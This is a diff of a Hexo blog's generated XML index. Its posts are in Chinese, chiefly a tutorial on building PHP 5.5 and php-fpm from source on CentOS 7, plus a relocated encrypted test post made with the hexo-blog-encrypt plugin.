+<li>创建文件夹</li>
+</ol>
+<pre class="language-none"><code class="language-none">mkdir &#x2F;usr&#x2F;local&#x2F;src&#x2F;php 
+
+cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;php</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130813652.png" alt="1" loading="lazy"></p>
+<ol start="2">
+<li>安装依赖</li>
+</ol>
+<pre class="language-none"><code class="language-none">yum install -y gcc gcc-c++ autoconf libjpeg libjpeg-devel libpng libpng-devel freetype freetype-devel libpng libpng-devel libxml2 libxml2-devel zlib zlib-devel glibc glibc-devel glib2 glib2-devel bzip2 bzip2-devel ncurses curl openssl-devel gdbm-devel db4-devel libXpm-devel libX11-devel gd-devel gmp-devel readline-devel libxslt-devel expat-devel xmlrpc-c xmlrpc-c-devel</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130813996.png" alt="2" loading="lazy"></p>
+<ol start="3">
+<li>解压下载的php源码包</li>
+</ol>
+<pre class="language-none"><code class="language-none">tar -xzvf +你的包名.tar.gz</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814770.png" alt="3" loading="lazy"></p>
+<ol start="4">
+<li><p>将解压的文件复制到&#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;下</p>
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814486.png" alt="4" loading="lazy"></p>
+</li>
+<li><p>进入&#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.5.25这个文件夹后在终端输入如下命令</p>
+</li>
+</ol>
+<pre class="language-none"><code class="language-none">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.5.25</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814634.png" alt="5" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">.&#x2F;configure --prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;php --with-config-file-path&#x3D;&#x2F;usr&#x2F;local&#x2F;php&#x2F;etc --enable-fpm --enable-sysvsem --enable-sockets --enable-pcntl --enable-mbstring --enable-mysqlnd --enable-opcache --enable-shmop --enable-zip --enable-ftp --enable-gd-native-ttf --enable-wddx --enable-soap</code></pre>
+
+
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814784.png" alt="6" loading="lazy"></p>
+<pre class="language-none"><code class="language-none">make</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814067.png" alt="7" loading="lazy"></p>
+<ol start="6">
+<li>安装</li>
+</ol>
+<pre class="language-none"><code class="language-none">make install
+
+cp &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf.default php-fpm.conf
+
+cp &#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.3.28&#x2F;php.ini-development &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini-development
+
+cp &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini-development &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php.ini
+
+cp &#x2F;usr&#x2F;local&#x2F;src&#x2F;php&#x2F;php-5.3.28&#x2F;sapi&#x2F;fpm&#x2F;init.d.php-fpm &#x2F;etc&#x2F;init.d&#x2F;php-fpm</code></pre>
+
+<p><img src="https://luren-1310495826.cos.ap-beijing.myqcloud.com/blog/202204130814525.png" alt="8" loading="lazy"></p>
+<ol start="7">
+<li>添加权限</li>
+</ol>
+<pre class="language-none"><code class="language-none">chmod +x &#x2F;etc&#x2F;init.d&#x2F;php-fpm</code></pre>
+
+<ol start="8">
+<li>添加开机启动</li>
+</ol>
+<pre class="language-none"><code class="language-none">chkconfig --add php-fpm</code></pre>
+
+<ol start="9">
+<li>设置启动等级</li>
+</ol>
+<pre class="language-none"><code class="language-none">chkconfig --level 35 php-fpm on
+
+cp &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf.default &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf
+
+vim &#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;php-fpm.conf 
+
+找到 ;pid &#x3D; run&#x2F;php-fpm.pid 去掉前面的分号</code></pre>
+
+<ol start="10">
+<li>启动</li>
+</ol>
+<pre class="language-none"><code class="language-none">service php-fpm start</code></pre>
+
+<ol start="11">
+<li>设置环境变量</li>
+</ol>
+<pre class="language-none"><code class="language-none">vim &#x2F;etc&#x2F;profile 
+
+底部添加
+PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;php&#x2F;bin环境变量生效 source &#x2F;etc&#x2F;profile</code></pre>
+
+<ol start="12">
+<li>查看安装版本</li>
+</ol>
+<pre class="language-none"><code class="language-none">php -v</code></pre>
+]]></content>
+      <categories>
+        <category>教程</category>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>CentOS7</tag>
       </tags>
   </entry>
   <entry>
@@ -2893,7 +3528,7 @@ apt-get dist-upgrade		#根据依赖关系更新</code></pre>
     <title>《天堂旅行团》摘抄</title>
     <url>/posts/7d0fc3d8/</url>
     <content><![CDATA[
-    <div id="aplayer-suEVsNqy" class="aplayer aplayer-tag-marker meting-tag-marker"
+    <div id="aplayer-hhScAmrJ" class="aplayer aplayer-tag-marker meting-tag-marker"
          data-id="1891034510" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#C20C0C"
     ></div>
 
@@ -3640,29 +4275,6 @@ mountvol X: &#x2F;d</code></pre>
       </tags>
   </entry>
   <entry>
-    <title>文章加密测试</title>
-    <url>/posts/26ea2038/</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="45493f54575ac24ab52c573bee6c809c7a673ad4c6f95ff65b5fb3c21e612f75">4630436162ade97ba2718b7d0c4b3b63ab61f9dccafd90df80aefd813e143f08de93bf5e829472e18d30f2602dda750044e68c61e4f14f6bb81c827fb60bc8a8d064aca140b82a400b0852ba0472dd6dd2aa00250fece1030044069a8e96d731baa5f018676e72da6a8fec8e2f01b5cbf078ff7ca8d7f3f29a4005bb7a029054a75d1a483c2370dc62bcfb4221743f2a5da53ede0eb505923e4b23d3865e095fc11adee9742ade4316198013a216bc538c0cf87bf04bd3e42e112385961808a94e6c5918a5df5189520ffb2e15ce2e0e8212f4804012189aceeb33d36c6b321b6c9931814a59bca4360bab198a9a6865c13d6f3f474f21501f8ec8786a9fc822b2572762ff6509ab654b8849d1e3ce19355e6007a43759cadc1c14ab34ad285f62849dc29f63df7e74d1b6bdcdbee8217fb0d639e23d63abc38757c001ebfc0bdb51cb710233d801a5d04f9464fb682f86405ef6c8a570694ea6604cd1fa79492c239070ffd5ee35023047f58b63178c98bb102fa74133a57f9fb8ec503bc31acf7220eefc39b2cac4b7cb784f84505ba82527959dbf478764fa2294c9799f6bce4e9d2392a2e0f577ee7231f9e6f4e47953227ae855a1179b0377c87167f6a6c97a6e3602a7418f0685a9c3e281f2a645d481da7c190f4649a2753045cfdb542e91c17919d2cdc25e08741ff81526c9eeabe190c2e80bdf5e79ca3e7f7c11e37d35f9f7c9db7d13cf81451f42ddb5e7e38d684df65656405c5a63a901c92e777bf7b4da45195a17e2be3f3fe047ea58b47820a60a7dc28153680035f2decedd095f15ee76c29dca8715c6825a93c236592b3615af1cefb119bf9992a28b3447799f567a3b6370f84de07e0b4f3a981b409dc1651fb5236239cb0dbb47e10a7ba3ac1a8f1800d2b9f8279910f8b00df92337d8960e60224a1eff66010206b79e213aa9555d8897e5a4f77843be183143060e57e9a88798d7f6a78cf337ceb80b722489f5cf4582e95419b8da06d20c323cfa626cdfeaddd7d11d4db64c3a9331bfec82b40a98f3c3491b285d436a4e9db81e85bb1995cacfccb564d152af0a76b5f599252d7e8b2f90277695f8272735db6488e3c9639e4f2d8ee0e0845b46109a2065225f64b37420ea2ca4e4833eb71a86c16e40a0861f853ca3f40fb12b6de5623533f3c201cb8cffa25333a4d74a43a1b3617a0ad58e5b423753b443321c73cd05aab38662c378a9dc23c85634eef190ca8d50be111a8a9baf3bc6e66c5b414fbedce3f45ac7d1ef5ca242ddcb5ea4c39d45ffeb319fc2445c7aacdd55518bf40e7adb398b2d7b380edf12ecc90586cccd5a27dda7b0ff6472538c8012a98c0bc1e62bc020dec9dace84dc4ef330f7a9e85e05603b8652646d789dc13de31a36273d59f010ae4aa22417d3a93a1f9111bb1eb859189def49a6892e3c0f7cd01578c893adaca6c4709cf2e45ec6a687751677dfc910f3a44cf5a7fdaaf5a41202f0d7d4861cb5623c06a1312fc6670a4fd0dc1953c726ebe5ea2bbce45b0aca90152df82f7edff29a6b07fed1b490214a462a2c52f95150ee8991d4a70cd25fd29764585535b8270ad297ebedc42ed790321de3e940cb6769271702d04271b88090d333d8f543679ed7ecc0a3701d71b0e9e5bd78a2e0494d8bbc1ff5f19663f34d7246c67829c2011a656710f4233218281db0dcd1626d4643f135651d2c701001face7ff2b6f31fb0edaf2d4df6ace5062e62e6746f87211bf6154dc645bc4fb77d731fd9552414fed22e31ed031397e6aced5e3656e6a7ed473f2bb58709e010f5c7ce5b879da4e5f70e39590ee9cbf1865f8c70c43c4b31c99605898adaa22c0c9b7e53b0c3d67b1b92c6835cb43662ddff5f318557dd110d29dc35c43800bb856b898b3d048e3f27fce85189133985e4ab1b2416b50b5420c10f6a0e7ab9d3670151f38ca7be3245e009fc79237ee4117a3fd5f1c782a2b759b740a0623943768f91ae96a062fa566ad69aaa2211de959fdee89141ba695803f70a64143864f5689038fd856fa5f147b6e3350da6767088660b483ae1ff6f853d6b0c02cc0d65dfffe02f71802d1fd43187dfdcc7147d940db974a18c62c4618d90918ee67565e01143a6e3a1b578c574f08c2eedf92028b1237d2a06cf6cbe92ec7a298bf8b1e03f91add0e9a950706c2950029477a047aa88f67867c5ce33f4b80534c71b928329ffb775733a50e9a8b48af1fc74155d616529040b5785634f60e022d3549b07ea0384bbaee9524c1c088e1857c36c5f4487619aedbbb3bf90941294f2fb806399cab501f452b964f3eb054b4ae7feea48a9aad62df623aae1af3161d8f4b2ec9d1e8db5d625dc103cf3b3c71468de6f0f2f79f85c03df3daf5623adea894b625842c0b86656fb40b5e53e7e69cc7a77f91e5a13e49f1b8ec5e46a31a47dfde387abd44c0fd35f9871c153f70d3c74e04280d8cf83bd204aa21ef5df040c265f69c3a26d7a1cd7e1f16fed0bd717e95c1f79c94ffdc991c967b5a31f2b303a91b49e883d0dd4b4fec4d74f60a3ae8a32481005f67fbbac34d218e8824c623df621f95b866486b3b9d62b79457ef2641f3b737ed41fc48c167d645ea729e78915f01f71febb543df8f3c937f77d284980f45526fd78a4b66d93f9ddd9ce7f4e2b42ee8416d8835dc2abc8a8656585df2cb7d88817764a5bd4d0bc59b633a85b968c179226de030821ba97802dccf1214ee90ecd00f72f07a1e3d488acd165e76056ac7f6ad93e260938e8195cf965bb7a4b46cc1253ddd65db8fc911401640bfbe33b813a8132608f4d1ade897693c5fa5695ad1f859e06735f2affe61b38b3582bef37d5e841ae472d69ba7eeeccf61cd79ea02acaa89341df970af7514b467c7b79cfc38df61128057d6f672341752c8e215757d3a063446629288b256bdf99a386be3eacfdc404a35d5744f24d2ed834106708f4d9a59ceffaf00926688dc9b01ca24eb1c27843459ea4698c4710bc75a5188fd819cd8df0752c95d6c249d16bcfa6b4690f5daee61397ce69fe3adf54c96154608b175a49fd1881c99e087ab5ca82d985d651912e8ceb0e19d1d7c5b58161b3cf07d36b7486118fbac55927a6ac500f2c4bedca9f4aa3166c99d84b8ba46e3843a0879d5a1b54</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试密码123456</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>教程</category>
-        <category>博客</category>
-      </categories>
-      <tags>
-        <tag>Hexo</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>流程图(flowchart)语法学习</title>
     <url>/posts/4b7a36ad/</url>
     <content><![CDATA[<h2 id="语法介绍"><a href="#语法介绍" class="headerlink" title="语法介绍"></a>语法介绍</h2><h3 id="定义所有元素"><a href="#定义所有元素" class="headerlink" title="定义所有元素"></a><strong>定义所有元素</strong></h3><p><strong>start 开始节点</strong></p>
@@ -3781,6 +4393,29 @@ conditionID(yes)->endID</textarea><textarea id="flowchart-1-options" style="disp
       </categories>
       <tags>
         <tag>其他</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>文章加密测试</title>
+    <url>/posts/26ea2038/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="45493f54575ac24ab52c573bee6c809c7a673ad4c6f95ff65b5fb3c21e612f75">4630436162ade97ba2718b7d0c4b3b63ab61f9dccafd90df80aefd813e143f08de93bf5e829472e18d30f2602dda750044e68c61e4f14f6bb81c827fb60bc8a8d064aca140b82a400b0852ba0472dd6dd2aa00250fece1030044069a8e96d731baa5f018676e72da6a8fec8e2f01b5cbf078ff7ca8d7f3f29a4005bb7a029054a75d1a483c2370dc62bcfb4221743f2a5da53ede0eb505923e4b23d3865e095fc11adee9742ade4316198013a216bc538c0cf87bf04bd3e42e112385961808a94e6c5918a5df5189520ffb2e15ce2e0e8212f4804012189aceeb33d36c6b321b6c9931814a59bca4360bab198a9a6865c13d6f3f474f21501f8ec8786a9fc822b2572762ff6509ab654b8849d1e3ce19355e6007a43759cadc1c14ab34ad285f62849dc29f63df7e74d1b6bdcdbee8217fb0d639e23d63abc38757c001ebfc0bdb51cb710233d801a5d04f9464fb682f86405ef6c8a570694ea6604cd1fa79492c239070ffd5ee35023047f58b63178c98bb102fa74133a57f9fb8ec503bc31acf7220eefc39b2cac4b7cb784f84505ba82527959dbf478764fa2294c9799f6bce4e9d2392a2e0f577ee7231f9e6f4e47953227ae855a1179b0377c87167f6a6c97a6e3602a7418f0685a9c3e281f2a645d481da7c190f4649a2753045cfdb542e91c17919d2cdc25e08741ff81526c9eeabe190c2e80bdf5e79ca3e7f7c11e37d35f9f7c9db7d13cf81451f42ddb5e7e38d684df65656405c5a63a901c92e777bf7b4da45195a17e2be3f3fe047ea58b47820a60a7dc28153680035f2decedd095f15ee76c29dca8715c6825a93c236592b3615af1cefb119bf9992a28b3447799f567a3b6370f84de07e0b4f3a981b409dc1651fb5236239cb0dbb47e10a7ba3ac1a8f1800d2b9f8279910f8b00df92337d8960e60224a1eff66010206b79e213aa9555d8897e5a4f77843be183143060e57e9a88798d7f6a78cf337ceb80b722489f5cf4582e95419b8da06d20c323cfa626cdfeaddd7d11d4db64c3a9331bfec82b40a98f3c3491b285d436a4e9db81e85bb1995cacfccb564d152af0a76b5f599252d7e8b2f90277695f8272735db6488e3c9639e4f2d8ee0e0845b46109a2065225f64b37420ea2ca4e4833eb71a86c16e40a0861f853ca3f40fb12b6de5623533f3c201cb8cffa25333a4d74a43a1b3617a0ad58e5b423753b443321c73cd05aab38662c378a9dc23c85634eef190ca8d50be111a8a9baf3bc6e66c5b414fbedce3f45ac7d1ef5ca242ddcb5ea4c39d45ffeb319fc2445c7aacdd55518bf40e7adb398b2d7b380edf12ecc90586cccd5a27dda7b0ff6472538c8012a98c0bc1e62bc020dec9dace84dc4ef330f7a9e85e05603b8652646d789dc13de31a36273d59f010ae4aa22417d3a93a1f9111bb1eb859189def49a6892e3c0f7cd01578c893adaca6c4709cf2e45ec6a687751677dfc910f3a44cf5a7fdaaf5a41202f0d7d4861cb5623c06a1312fc6670a4fd0dc1953c726ebe5ea2bbce45b0aca90152df82f7edff29a6b07fed1b490214a462a2c52f95150ee8991d4a70cd25fd29764585535b8270ad297ebedc42ed790321de3e940cb6769271702d04271b88090d333d8f543679ed7ecc0a3701d71b0e9e5bd78a2e0494d8bbc1ff5f19663f34d7246c67829c2011a656710f4233218281db0dcd1626d4643f135651d2c701001face7ff2b6f31fb0edaf2d4df6ace5062e62e6746f87211bf6154dc645bc4fb77d731fd9552414fed22e31ed031397e6aced5e3656e6a7ed473f2bb58709e010f5c7ce5b879da4e5f70e39590ee9cbf1865f8c70c43c4b31c99605898adaa22c0c9b7e53b0c3d67b1b92c6835cb43662ddff5f318557dd110d29dc35c43800bb856b898b3d048e3f27fce85189133985e4ab1b2416b50b5420c10f6a0e7ab9d3670151f38ca7be3245e009fc79237ee4117a3fd5f1c782a2b759b740a0623943768f91ae96a062fa566ad69aaa2211de959fdee89141ba695803f70a64143864f5689038fd856fa5f147b6e3350da6767088660b483ae1ff6f853d6b0c02cc0d65dfffe02f71802d1fd43187dfdcc7147d940db974a18c62c4618d90918ee67565e01143a6e3a1b578c574f08c2eedf92028b1237d2a06cf6cbe92ec7a298bf8b1e03f91add0e9a950706c2950029477a047aa88f67867c5ce33f4b80534c71b928329ffb775733a50e9a8b48af1fc74155d616529040b5785634f60e022d3549b07ea0384bbaee9524c1c088e1857c36c5f4487619aedbbb3bf90941294f2fb806399cab501f452b964f3eb054b4ae7feea48a9aad62df623aae1af3161d8f4b2ec9d1e8db5d625dc103cf3b3c71468de6f0f2f79f85c03df3daf5623adea894b625842c0b86656fb40b5e53e7e69cc7a77f91e5a13e49f1b8ec5e46a31a47dfde387abd44c0fd35f9871c153f70d3c74e04280d8cf83bd204aa21ef5df040c265f69c3a26d7a1cd7e1f16fed0bd717e95c1f79c94ffdc991c967b5a31f2b303a91b49e883d0dd4b4fec4d74f60a3ae8a32481005f67fbbac34d218e8824c623df621f95b866486b3b9d62b79457ef2641f3b737ed41fc48c167d645ea729e78915f01f71febb543df8f3c937f77d284980f45526fd78a4b66d93f9ddd9ce7f4e2b42ee8416d8835dc2abc8a8656585df2cb7d88817764a5bd4d0bc59b633a85b968c179226de030821ba97802dccf1214ee90ecd00f72f07a1e3d488acd165e76056ac7f6ad93e260938e8195cf965bb7a4b46cc1253ddd65db8fc911401640bfbe33b813a8132608f4d1ade897693c5fa5695ad1f859e06735f2affe61b38b3582bef37d5e841ae472d69ba7eeeccf61cd79ea02acaa89341df970af7514b467c7b79cfc38df61128057d6f672341752c8e215757d3a063446629288b256bdf99a386be3eacfdc404a35d5744f24d2ed834106708f4d9a59ceffaf00926688dc9b01ca24eb1c27843459ea4698c4710bc75a5188fd819cd8df0752c95d6c249d16bcfa6b4690f5daee61397ce69fe3adf54c96154608b175a49fd1881c99e087ab5ca82d985d651912e8ceb0e19d1d7c5b58161b3cf07d36b7486118fbac55927a6ac500f2c4bedca9f4aa3166c99d84b8ba46e3843a0879d5a1b54</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试密码123456</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>教程</category>
+        <category>博客</category>
+      </categories>
+      <tags>
+        <tag>Hexo</tag>
       </tags>
   </entry>
   <entry>
